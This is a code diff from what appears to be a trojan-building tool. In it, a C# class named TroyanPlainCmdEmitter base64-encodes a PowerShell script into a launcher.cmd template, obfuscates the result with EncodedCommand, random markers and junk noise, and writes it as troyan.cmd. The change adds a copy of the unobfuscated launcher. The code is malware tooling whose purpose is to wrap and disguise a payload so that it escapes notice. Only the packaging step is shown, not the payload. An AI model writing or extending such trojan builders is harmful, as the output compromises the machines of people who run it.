@@ -2,7 +2,7 @@ using Commons;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>troyan.cmd</c> with standard base64 of plain <c>body.debug.ps1</c>, then light-obfuscates (EncodedCommand, random markers, junk noise).</summary>
+/// <summary>Writes <c>troyan.cmd</c> with standard base64 of plain <c>body.debug.ps1</c>, then light-obfuscates (EncodedCommand, random markers, junk noise). Saves the pre-obfuscation text as <c>troyan.cmd.nonobfuscated</c>.</summary>
 public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
 {
     private readonly ITroyanCmdObfuscator _obfuscator;
@@ -25,10 +25,14 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
         if (!template.Contains(placeholder, StringComparison.Ordinal))
             throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");
 
-        var cmd = _obfuscator.Obfuscate(template.Replace(placeholder, b64, StringComparison.Ordinal));
+        var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
+        var obfuscated = _obfuscator.Obfuscate(plain);
+
         var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
         if (!string.IsNullOrEmpty(dir))
             Directory.CreateDirectory(dir);
-        File.WriteAllText(layout.TroyanOutputCmd, cmd);
+
+        File.WriteAllText(layout.TroyanOutputCmdNonObfuscated, plain);
+        File.WriteAllText(layout.TroyanOutputCmd, obfuscated);
     }
 }
